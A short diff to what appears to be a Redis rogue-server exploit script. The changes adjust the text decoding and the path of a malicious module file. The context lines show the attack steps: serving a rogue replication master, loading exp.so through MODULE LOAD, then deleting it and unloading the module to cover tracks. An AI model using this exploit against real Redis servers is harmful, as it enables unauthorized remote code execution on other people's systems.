@@ -25,7 +25,7 @@ def din(sock, cnt):
         print(f"\033[1;34;40m[->]\033[0m {msg}")
     else:
         print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
-    return msg.decode()
+    return msg.decode('gb18030')
 
 def dout(sock, msg):
     if type(msg) != bytes:
@@ -120,7 +120,7 @@ def runserver(rhost, rport, lhost, lport):
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
-    remote.do("MODULE LOAD /var/lib/redis/exp.so")
+    remote.do("MODULE LOAD ./exp.so")
     remote.do("SLAVEOF NO ONE")
 
     # Operations here
@@ -128,7 +128,7 @@ def runserver(rhost, rport, lhost, lport):
 
     # clean up
     remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd("rm /var/lib/redis/exp.so")
+    remote.shell_cmd("rm ./exp.so")
     remote.do("MODULE UNLOAD system")
 
 if __name__ == '__main__':
